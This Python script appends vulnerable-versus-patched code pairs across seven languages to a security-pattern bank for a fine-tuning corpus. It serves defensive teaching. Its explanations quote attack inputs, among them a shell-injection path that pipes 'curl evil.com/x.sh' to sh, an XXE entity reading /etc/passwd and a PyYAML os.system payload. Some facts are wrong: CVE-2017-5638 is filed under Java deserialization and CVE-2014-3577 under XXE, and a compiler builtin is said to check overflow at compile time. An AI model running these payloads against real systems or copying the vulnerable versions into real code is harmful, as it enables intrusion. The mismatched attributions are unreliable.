#!/usr/bin/env python3
"""Append v0.9.17 expansion patterns to data/raw/code_security_patterns.jsonl.

The original bet 7 bank had 12 patterns, heavily Python-biased. This
script appends 20 new patterns covering 7 languages (Python, JS,
Java, Go, C, Ruby, PHP) so the bet 7 SFT corpus grows from 48 records
to 128. Idempotent: re-running skips IDs already present.

Run once on the Mac:
  PYTHONPATH=. python3 scripts/expand_code_security_bank.py
  PYTHONPATH=. python3 scripts/synth_code_security.py \\
      --bank data/raw/code_security_patterns.jsonl \\
      --out data/processed/synth_code_security.jsonl
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
BANK = REPO_ROOT / "data" / "raw" / "code_security_patterns.jsonl"


# Each pattern: id, cwe, name, language, vulnerable, patched, explanation,
# cve_examples. The same shape the original 12-pattern bank uses.
NEW_PATTERNS = [
    # ---- JavaScript ------------------------------------------------------
    {
        "id": "PAT-013", "cwe": "CWE-1321",
        "name": "Prototype pollution via deep merge",
        "language": "javascript",
        "vulnerable": (
            "function merge(target, source) {\n"
            "  for (const k in source) {\n"
            "    if (typeof source[k] === 'object') {\n"
            "      target[k] = target[k] || {};\n"
            "      merge(target[k], source[k]);\n"
            "    } else {\n"
            "      target[k] = source[k];\n"
            "    }\n"
            "  }\n"
            "  return target;\n"
            "}"
        ),
        "patched": (
            "function merge(target, source) {\n"
            "  for (const k in source) {\n"
            "    if (k === '__proto__' || k === 'constructor' "
            "|| k === 'prototype') continue;\n"
            "    if (typeof source[k] === 'object' && source[k] !== null) {\n"
            "      if (!Object.prototype.hasOwnProperty.call(target, k)) {\n"
            "        target[k] = {};\n"
            "      }\n"
            "      merge(target[k], source[k]);\n"
            "    } else {\n"
            "      target[k] = source[k];\n"
            "    }\n"
            "  }\n"
            "  return target;\n"
            "}"
        ),
        "explanation": (
            "The vulnerable merge walks every key of `source` including "
            "`__proto__`, so a payload like `{\"__proto__\": {\"isAdmin\": "
            "true}}` writes to `Object.prototype` and every plain object "
            "in the program inherits the polluted property. The patched "
            "version explicitly skips `__proto__`, `constructor`, and "
            "`prototype` keys, and uses `hasOwnProperty` to avoid "
            "treating prototype-chain entries as legitimate targets. "
            "Lodash, jQuery, minimist, and many others have shipped "
            "this exact bug; the structural fix is the dangerous-key "
            "denylist."
        ),
        "cve_examples": ["CVE-2019-10744", "CVE-2020-7598"],
    },
    {
        "id": "PAT-014", "cwe": "CWE-78",
        "name": "Shell injection via child_process.exec",
        "language": "javascript",
        "vulnerable": (
            "const { exec } = require('child_process');\n"
            "function archive(path) {\n"
            "  exec(`tar czf /tmp/out.tgz ${path}`, (err, out) => {\n"
            "    console.log(out);\n"
            "  });\n"
            "}"
        ),
        "patched": (
            "const { execFile } = require('child_process');\n"
            "function archive(path) {\n"
            "  execFile('tar', ['czf', '/tmp/out.tgz', path], "
            "(err, out) => {\n"
            "    console.log(out);\n"
            "  });\n"
            "}"
        ),
        "explanation": (
            "`exec` runs its argument through a shell, so any "
            "metacharacter in `path` (`;`, `&&`, `$()`, backticks) "
            "executes as a separate command. A path of "
            "`foo; curl evil.com/x.sh | sh` triggers RCE. `execFile` "
            "spawns the binary directly with arguments as a list; "
            "the shell never sees the input, so metacharacters are "
            "treated as literal filename characters."
        ),
        "cve_examples": ["CVE-2021-21287"],
    },
    {
        "id": "PAT-015", "cwe": "CWE-1333",
        "name": "ReDoS via catastrophic regex backtracking",
        "language": "javascript",
        "vulnerable": (
            "function isValidEmail(s) {\n"
            "  return /^([a-zA-Z0-9]+)*@example\\.com$/.test(s);\n"
            "}"
        ),
        "patched": (
            "function isValidEmail(s) {\n"
            "  if (s.length > 254) return false;\n"
            "  return /^[a-zA-Z0-9]+@example\\.com$/.test(s);\n"
            "}"
        ),
        "explanation": (
            "`([a-zA-Z0-9]+)*` is the canonical catastrophic-backtracking "
            "shape: nested quantifiers over overlapping character classes. "
            "An input like `aaaaaaaaaaaaaaaaaaaaaaaaaaaa!` makes the regex "
            "engine try every partition of the leading `a`s, which is "
            "exponential in the input length. The patched version drops "
            "the inner group (no nesting) and bounds the input length "
            "before running the regex."
        ),
        "cve_examples": ["CVE-2021-23337", "CVE-2017-15010"],
    },
    # ---- Java ------------------------------------------------------------
    {
        "id": "PAT-016", "cwe": "CWE-89",
        "name": "SQL injection via Statement concatenation",
        "language": "java",
        "vulnerable": (
            "import java.sql.*;\n"
            "public class UserDao {\n"
            "  public ResultSet find(Connection c, String name) "
            "throws SQLException {\n"
            "    Statement s = c.createStatement();\n"
            "    return s.executeQuery(\n"
            "      \"SELECT id FROM users WHERE name = '\" + name + \"'\");\n"
            "  }\n"
            "}"
        ),
        "patched": (
            "import java.sql.*;\n"
            "public class UserDao {\n"
            "  public ResultSet find(Connection c, String name) "
            "throws SQLException {\n"
            "    PreparedStatement ps = c.prepareStatement(\n"
            "      \"SELECT id FROM users WHERE name = ?\");\n"
            "    ps.setString(1, name);\n"
            "    return ps.executeQuery();\n"
            "  }\n"
            "}"
        ),
        "explanation": (
            "`Statement.executeQuery` concatenates the input into the "
            "query text, so a name of `' OR '1'='1` returns every user "
            "row. `PreparedStatement` separates the SQL template from "
            "the parameter values: the JDBC driver binds the parameter "
            "as a typed value, never as text appended to the query."
        ),
        "cve_examples": ["CVE-2018-1262"],
    },
    {
        "id": "PAT-017", "cwe": "CWE-502",
        "name": "Java deserialization of untrusted ObjectInputStream",
        "language": "java",
        "vulnerable": (
            "import java.io.*;\n"
            "public class Loader {\n"
            "  public Object load(byte[] data) throws Exception {\n"
            "    ObjectInputStream ois = new ObjectInputStream(\n"
            "      new ByteArrayInputStream(data));\n"
            "    return ois.readObject();\n"
            "  }\n"
            "}"
        ),
        "patched": (
            "import java.io.*;\n"
            "import com.fasterxml.jackson.databind.ObjectMapper;\n"
            "public class Loader {\n"
            "  private static final ObjectMapper M = new ObjectMapper();\n"
            "  public MyDto load(byte[] data) throws IOException {\n"
            "    // JSON deserialization; no gadget chains.\n"
            "    return M.readValue(data, MyDto.class);\n"
            "  }\n"
            "}"
        ),
        "explanation": (
            "`ObjectInputStream.readObject` instantiates whatever class "
            "the serialized bytes name, calling its `readObject` "
            "method, which in many libraries (Apache Commons, Spring) "
            "executes arbitrary code via gadget chains. The structural "
            "fix is to drop Java serialization for untrusted data and "
            "use a format that does not call constructor-time logic "
            "(JSON via Jackson, MessagePack, protobuf). Restricting "
            "the deserialization class set with a custom "
            "`resolveClass` is a partial fix but is widely known to be "
            "bypassable."
        ),
        "cve_examples": ["CVE-2015-7501", "CVE-2017-5638"],
    },
    {
        "id": "PAT-018", "cwe": "CWE-611",
        "name": "XXE via default DocumentBuilder",
        "language": "java",
        "vulnerable": (
            "import javax.xml.parsers.*;\n"
            "import org.w3c.dom.Document;\n"
            "public class XmlLoader {\n"
            "  public Document parse(byte[] xml) throws Exception {\n"
            "    DocumentBuilderFactory f = "
            "DocumentBuilderFactory.newInstance();\n"
            "    DocumentBuilder b = f.newDocumentBuilder();\n"
            "    return b.parse(new java.io.ByteArrayInputStream(xml));\n"
            "  }\n"
            "}"
        ),
        "patched": (
            "import javax.xml.XMLConstants;\n"
            "import javax.xml.parsers.*;\n"
            "import org.w3c.dom.Document;\n"
            "public class XmlLoader {\n"
            "  public Document parse(byte[] xml) throws Exception {\n"
            "    DocumentBuilderFactory f = "
            "DocumentBuilderFactory.newInstance();\n"
            "    f.setFeature(\n"
            "      \"http://apache.org/xml/features/disallow-doctype-decl\","
            " true);\n"
            "    f.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n"
            "    f.setExpandEntityReferences(false);\n"
            "    DocumentBuilder b = f.newDocumentBuilder();\n"
            "    return b.parse(new java.io.ByteArrayInputStream(xml));\n"
            "  }\n"
            "}"
        ),
        "explanation": (
            "By default the JDK's XML parsers resolve external "
            "entities, so a document with `<!ENTITY x SYSTEM "
            "\"file:///etc/passwd\">` reads local files into the "
            "parsed DOM. The patched version disables doctype "
            "declarations entirely and turns on the JAXP secure-"
            "processing feature, which also bounds entity expansion."
        ),
        "cve_examples": ["CVE-2014-3577"],
    },
    # ---- Go --------------------------------------------------------------
    {
        "id": "PAT-019", "cwe": "CWE-89",
        "name": "Go SQL injection via fmt.Sprintf",
        "language": "go",
        "vulnerable": (
            "func GetUser(db *sql.DB, name string) (*User, error) {\n"
            "  row := db.QueryRow(fmt.Sprintf(\n"
            "    \"SELECT id, email FROM users WHERE name = '%s'\", name))\n"
            "  u := &User{}\n"
            "  return u, row.Scan(&u.ID, &u.Email)\n"
            "}"
        ),
        "patched": (
            "func GetUser(db *sql.DB, name string) (*User, error) {\n"
            "  row := db.QueryRow(\n"
            "    \"SELECT id, email FROM users WHERE name = $1\", name)\n"
            "  u := &User{}\n"
            "  return u, row.Scan(&u.ID, &u.Email)\n"
            "}"
        ),
        "explanation": (
            "`fmt.Sprintf` builds the SQL string from the input, so a "
            "name of `' OR '1'='1` returns every row. `database/sql` "
            "supports parameter placeholders (`$1`, `?` depending on "
            "driver); the driver binds the value safely so quoting and "
            "escaping is the driver's responsibility, not the caller's."
        ),
        "cve_examples": [],
    },
    {
        "id": "PAT-020", "cwe": "CWE-330",
        "name": "Go using math/rand for security tokens",
        "language": "go",
        "vulnerable": (
            "import \"math/rand\"\n"
            "func GenerateToken() string {\n"
            "  b := make([]byte, 16)\n"
            "  for i := range b {\n"
            "    b[i] = byte(rand.Intn(256))\n"
            "  }\n"
            "  return hex.EncodeToString(b)\n"
            "}"
        ),
        "patched": (
            "import \"crypto/rand\"\n"
            "func GenerateToken() (string, error) {\n"
            "  b := make([]byte, 16)\n"
            "  if _, err := rand.Read(b); err != nil {\n"
            "    return \"\", err\n"
            "  }\n"
            "  return hex.EncodeToString(b), nil\n"
            "}"
        ),
        "explanation": (
            "Go's `math/rand` is a deterministic PRNG seeded from the "
            "default source (1, in older versions) or wall-clock time. "
            "Either way an attacker observing one token can recover the "
            "internal state and predict every other token from the same "
            "process. `crypto/rand` reads from the OS CSPRNG (`/dev/"
            "urandom` or equivalent), which is the right entropy source "
            "for tokens, keys, nonces, and IVs."
        ),
        "cve_examples": ["CVE-2020-7711"],
    },
    {
        "id": "PAT-021", "cwe": "CWE-22",
        "name": "Go path traversal via http.ServeFile",
        "language": "go",
        "vulnerable": (
            "func handler(w http.ResponseWriter, r *http.Request) {\n"
            "  name := r.URL.Query().Get(\"name\")\n"
            "  http.ServeFile(w, r, filepath.Join(\"/var/data\", name))\n"
            "}"
        ),
        "patched": (
            "var dataRoot, _ = filepath.Abs(\"/var/data\")\n"
            "func handler(w http.ResponseWriter, r *http.Request) {\n"
            "  name := filepath.Base(r.URL.Query().Get(\"name\"))\n"
            "  abs, err := filepath.Abs(filepath.Join(dataRoot, name))\n"
            "  if err != nil || !strings.HasPrefix(abs, dataRoot+"
            "string(os.PathSeparator)) {\n"
            "    http.NotFound(w, r); return\n"
            "  }\n"
            "  http.ServeFile(w, r, abs)\n"
            "}"
        ),
        "explanation": (
            "`filepath.Join` cleans separators but does NOT prevent "
            "`..` from escaping the prefix; `Join(\"/var/data\", "
            "\"../../etc/passwd\")` returns `/etc/passwd`. The patched "
            "version reduces the input to its base filename and then "
            "verifies the resolved absolute path is still inside "
            "`dataRoot`, preventing both `..` traversal and absolute-"
            "path escapes."
        ),
        "cve_examples": ["CVE-2018-7187"],
    },
    # ---- C / C++ ---------------------------------------------------------
    {
        "id": "PAT-022", "cwe": "CWE-134",
        "name": "Format string vulnerability in printf",
        "language": "c",
        "vulnerable": (
            "#include <stdio.h>\n"
            "void log_request(const char *user_input) {\n"
            "    printf(user_input);\n"
            "}"
        ),
        "patched": (
            "#include <stdio.h>\n"
            "void log_request(const char *user_input) {\n"
            "    printf(\"%s\", user_input);\n"
            "}"
        ),
        "explanation": (
            "`printf(user_input)` treats the user-controlled string as a "
            "format specifier. Inputs containing `%s`, `%n`, or `%x` "
            "read or write arbitrary stack memory: `%n` writes the byte "
            "count back through a pointer the attacker controls, "
            "yielding write-what-where. Always pass user data as a "
            "format argument (`printf(\"%s\", user_input)`), never as "
            "the format string itself."
        ),
        "cve_examples": ["CVE-2012-0809"],
    },
    {
        "id": "PAT-023", "cwe": "CWE-190",
        "name": "Integer overflow in size calculation",
        "language": "c",
        "vulnerable": (
            "#include <stdlib.h>\n"
            "char *concat(size_t a_len, size_t b_len) {\n"
            "    char *buf = malloc(a_len + b_len + 1);\n"
            "    return buf;\n"
            "}"
        ),
        "patched": (
            "#include <stdlib.h>\n"
            "#include <stdint.h>\n"
            "char *concat(size_t a_len, size_t b_len) {\n"
            "    if (a_len > SIZE_MAX - b_len - 1) return NULL;\n"
            "    char *buf = malloc(a_len + b_len + 1);\n"
            "    return buf;\n"
            "}"
        ),
        "explanation": (
            "`a_len + b_len + 1` wraps modulo `SIZE_MAX` if either "
            "input is large enough, so a 4 GiB length plus a small "
            "length allocates only a few bytes; subsequent writes "
            "overflow the heap. Always check the addends before "
            "summing: `a > SIZE_MAX - b` rejects any pair that would "
            "wrap. Compilers' `-fsanitize=undefined` flag catches the "
            "overflow at runtime; `__builtin_add_overflow` does it at "
            "compile time."
        ),
        "cve_examples": ["CVE-2002-0639", "CVE-2017-8779"],
    },
    {
        "id": "PAT-024", "cwe": "CWE-416",
        "name": "Use-after-free in linked list",
        "language": "c",
        "vulnerable": (
            "void list_remove(Node *n) {\n"
            "    if (n->prev) n->prev->next = n->next;\n"
            "    if (n->next) n->next->prev = n->prev;\n"
            "    free(n);\n"
            "    log(\"removed %d\\n\", n->id);  // n freed above\n"
            "}"
        ),
        "patched": (
            "void list_remove(Node *n) {\n"
            "    int id = n->id;  // copy before free\n"
            "    if (n->prev) n->prev->next = n->next;\n"
            "    if (n->next) n->next->prev = n->prev;\n"
            "    free(n);\n"
            "    n = NULL;\n"
            "    log(\"removed %d\\n\", id);\n"
            "}"
        ),
        "explanation": (
            "Reading `n->id` after `free(n)` is undefined behaviour. "
            "Modern allocators may reuse the freed slot for an "
            "attacker-controlled object, so `n->id` reads attacker "
            "data. The patched version copies the field before freeing "
            "and nulls the pointer afterward so any later use crashes "
            "deterministically rather than reading reused memory. "
            "AddressSanitizer (`-fsanitize=address`) catches this at "
            "test time; static analyzers flag the dataflow."
        ),
        "cve_examples": ["CVE-2019-11041", "CVE-2020-25684"],
    },
    # ---- Ruby ------------------------------------------------------------
    {
        "id": "PAT-025", "cwe": "CWE-502",
        "name": "Ruby YAML.load on untrusted data",
        "language": "ruby",
        "vulnerable": (
            "require 'yaml'\n"
            "def load_config(path)\n"
            "  YAML.load(File.read(path))\n"
            "end"
        ),
        "patched": (
            "require 'yaml'\n"
            "def load_config(path)\n"
            "  YAML.safe_load(File.read(path),\n"
            "                  permitted_classes: [Symbol, Date, Time])\n"
            "end"
        ),
        "explanation": (
            "`YAML.load` instantiates arbitrary Ruby classes named in "
            "the document and calls their `init_with` methods. A "
            "payload with `!ruby/object:Gem::Installer` plus chained "
            "Gem internals achieves RCE; this is the canonical Rails "
            "exploit. `YAML.safe_load` (and `Psych.safe_load`) limits "
            "deserialization to a permitted class list, so unknown "
            "classes raise instead of executing. Rails 5+ uses safe_load "
            "by default for fixtures."
        ),
        "cve_examples": ["CVE-2013-0156", "CVE-2022-32224"],
    },
    {
        "id": "PAT-026", "cwe": "CWE-915",
        "name": "Ruby on Rails mass assignment via params.permit!",
        "language": "ruby",
        "vulnerable": (
            "class UsersController < ApplicationController\n"
            "  def update\n"
            "    @user = User.find(params[:id])\n"
            "    @user.update(params[:user].permit!)\n"
            "    redirect_to @user\n"
            "  end\n"
            "end"
        ),
        "patched": (
            "class UsersController < ApplicationController\n"
            "  def update\n"
            "    @user = User.find(params[:id])\n"
            "    @user.update(user_params)\n"
            "    redirect_to @user\n"
            "  end\n"
            "  private\n"
            "  def user_params\n"
            "    params.require(:user).permit(:email, :name, :bio)\n"
            "  end\n"
            "end"
        ),
        "explanation": (
            "`permit!` whitelists every key in the params hash, so a "
            "request body containing `user[admin]=true` updates the "
            "admin column. The patched version explicitly enumerates "
            "the allowed columns; any extra key is silently dropped "
            "and never reaches the model. Strong Parameters is the "
            "Rails-canonical fix; permit! should never see user input."
        ),
        "cve_examples": ["CVE-2012-2660", "CVE-2012-2694"],
    },
    # ---- PHP -------------------------------------------------------------
    {
        "id": "PAT-027", "cwe": "CWE-89",
        "name": "PHP SQL injection via mysql_query concatenation",
        "language": "php",
        "vulnerable": (
            "<?php\n"
            "function get_user($conn, $username) {\n"
            "  $sql = \"SELECT id FROM users WHERE name = '\" "
            ". $username . \"'\";\n"
            "  return mysqli_query($conn, $sql);\n"
            "}"
        ),
        "patched": (
            "<?php\n"
            "function get_user($conn, $username) {\n"
            "  $stmt = mysqli_prepare($conn,\n"
            "    \"SELECT id FROM users WHERE name = ?\");\n"
            "  mysqli_stmt_bind_param($stmt, 's', $username);\n"
            "  mysqli_stmt_execute($stmt);\n"
            "  return mysqli_stmt_get_result($stmt);\n"
            "}"
        ),
        "explanation": (
            "Concatenating `$username` into the query lets an input of "
            "`' OR '1'='1` bypass the WHERE clause. Prepared statements "
            "with `mysqli_stmt_bind_param` send the SQL template and "
            "parameters to the server separately; the parameter is "
            "always treated as a literal value. PDO's `prepare` + "
            "`bindValue` is the equivalent for PDO drivers."
        ),
        "cve_examples": ["CVE-2017-6090"],
    },
    {
        "id": "PAT-028", "cwe": "CWE-98",
        "name": "PHP local file inclusion via $_GET",
        "language": "php",
        "vulnerable": (
            "<?php\n"
            "$page = $_GET['page'];\n"
            "include $page . '.php';"
        ),
        "patched": (
            "<?php\n"
            "$allowed = ['home', 'about', 'contact'];\n"
            "$page = $_GET['page'] ?? 'home';\n"
            "if (!in_array($page, $allowed, true)) {\n"
            "  $page = 'home';\n"
            "}\n"
            "include __DIR__ . '/pages/' . $page . '.php';"
        ),
        "explanation": (
            "An attacker passing `?page=../../../../etc/passwd%00` "
            "(PHP versions before null-byte fix) or wrapping the URL "
            "in `php://filter` reads server files or executes remote "
            "code. The patched version restricts `page` to a fixed "
            "allowlist and prepends a known directory, so any "
            "deviation falls back to the default. Allowlisting is the "
            "correct fix; sanitizing `..` is fragile."
        ),
        "cve_examples": ["CVE-2018-12613", "CVE-2017-9841"],
    },
    # ---- Python (extras the original 12 missed) -------------------------
    {
        "id": "PAT-029", "cwe": "CWE-502",
        "name": "Python yaml.load without SafeLoader",
        "language": "python",
        "vulnerable": (
            "import yaml\n"
            "def load_config(path):\n"
            "    with open(path) as f:\n"
            "        return yaml.load(f.read())"
        ),
        "patched": (
            "import yaml\n"
            "def load_config(path):\n"
            "    with open(path) as f:\n"
            "        return yaml.safe_load(f.read())"
        ),
        "explanation": (
            "`yaml.load` (without an explicit Loader) instantiates "
            "arbitrary Python classes. A payload like "
            "`!!python/object/apply:os.system [\"id\"]` runs `os.system` "
            "during parsing. PyYAML 6.0+ deprecated the unsafe default "
            "and requires explicit `Loader=...`; the safe choice is "
            "`yaml.safe_load`, which only emits standard YAML types "
            "(dict, list, str, int, float, bool, None)."
        ),
        "cve_examples": ["CVE-2017-18342", "CVE-2020-1747"],
    },
    {
        "id": "PAT-030", "cwe": "CWE-326",
        "name": "Python MD5 / SHA1 for password hashing",
        "language": "python",
        "vulnerable": (
            "import hashlib\n"
            "def hash_password(password: str) -> str:\n"
            "    return hashlib.md5(password.encode()).hexdigest()"
        ),
        "patched": (
            "import bcrypt\n"
            "def hash_password(password: str) -> bytes:\n"
            "    return bcrypt.hashpw(\n"
            "        password.encode(), bcrypt.gensalt(rounds=12))"
        ),
        "explanation": (
            "MD5 and SHA1 are fast cryptographic hashes designed for "
            "integrity, not password storage. A modern GPU can compute "
            "billions of MD5 hashes per second, so a leaked database "
            "is brute-forced in hours regardless of password length. "
            "Password hashes need an intentionally slow KDF: bcrypt, "
            "scrypt, Argon2id. bcrypt with cost 12 takes ~250ms per "
            "hash on commodity hardware, which is still imperceptible "
            "for login but stops offline cracking."
        ),
        "cve_examples": ["CVE-2018-19567"],
    },
    {
        "id": "PAT-031", "cwe": "CWE-1333",
        "name": "Python ReDoS via catastrophic email regex",
        "language": "python",
        "vulnerable": (
            "import re\n"
            "EMAIL_RE = re.compile(r'^([a-z]+)+@example\\.com$')\n"
            "def is_valid_email(s: str) -> bool:\n"
            "    return bool(EMAIL_RE.match(s))"
        ),
        "patched": (
            "import re\n"
            "EMAIL_RE = re.compile(r'^[a-z]+@example\\.com$')\n"
            "def is_valid_email(s: str) -> bool:\n"
            "    if len(s) > 254:\n"
            "        return False\n"
            "    return bool(EMAIL_RE.match(s))"
        ),
        "explanation": (
            "`([a-z]+)+` is the canonical catastrophic-backtracking "
            "shape: nested quantifiers over overlapping classes. An "
            "input of 30 lowercase letters followed by a `!` causes "
            "the regex engine to try every partition of the prefix, "
            "which is exponential in the input length and freezes "
            "the worker. The patched version flattens the nesting "
            "and bounds the input length first. Python 3.11+ has "
            "atomic groups (`(?>...)`) which also fix this; the "
            "structural fix is to remove the nested quantifier."
        ),
        "cve_examples": ["CVE-2021-23437"],
    },
    {
        "id": "PAT-032", "cwe": "CWE-285",
        "name": "Python missing authorisation check on sensitive endpoint",
        "language": "python",
        "vulnerable": (
            "from flask import Flask, request, abort\n"
            "from .db import get_user, delete_user\n"
            "app = Flask(__name__)\n"
            "@app.delete('/users/<int:user_id>')\n"
            "def delete(user_id):\n"
            "    delete_user(user_id)\n"
            "    return '', 204"
        ),
        "patched": (
            "from flask import Flask, request, abort\n"
            "from .db import get_user, delete_user\n"
            "from .auth import current_user\n"
            "app = Flask(__name__)\n"
            "@app.delete('/users/<int:user_id>')\n"
            "def delete(user_id):\n"
            "    me = current_user()\n"
            "    if me is None:\n"
            "        abort(401)\n"
            "    if me.id != user_id and not me.is_admin:\n"
            "        abort(403)\n"
            "    delete_user(user_id)\n"
            "    return '', 204"
        ),
        "explanation": (
            "The vulnerable handler will delete any user the caller "
            "names, regardless of who is authenticated. CWE-285 "
            "(Improper Authorization) and CWE-639 (Insecure Direct "
            "Object Reference) both apply. The fix is two checks: "
            "(1) the caller is authenticated at all, (2) the caller "
            "is the resource owner OR holds an explicit elevated "
            "permission. Many auth frameworks formalise this as a "
            "`@requires_role(...)` decorator or a policy rule."
        ),
        "cve_examples": ["CVE-2021-25646", "CVE-2022-22979"],
    },
]


def main() -> int:
    if not BANK.exists():
        print(f"[error] bank not found: {BANK}", file=sys.stderr)
        return 1
    existing_ids = set()
    with BANK.open("r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                rec = json.loads(line)
            except json.JSONDecodeError:
                continue
            existing_ids.add(rec.get("id"))
    print(f"  Existing patterns: {len(existing_ids)}")

    appended = 0
    with BANK.open("a", encoding="utf-8") as f:
        for p in NEW_PATTERNS:
            if p["id"] in existing_ids:
                continue
            f.write(json.dumps(p, ensure_ascii=False) + "\n")
            appended += 1
    print(f"  Appended:          {appended}")
    print(f"  Total now:         {len(existing_ids) + appended}")
    print()
    print("Re-run synth to produce updated SFT corpus:")
    print("  PYTHONPATH=. python3 scripts/synth_code_security.py \\")
    print("      --bank data/raw/code_security_patterns.jsonl \\")
    print("      --out data/processed/synth_code_security.jsonl")
    return 0


if __name__ == "__main__":
    sys.exit(main())
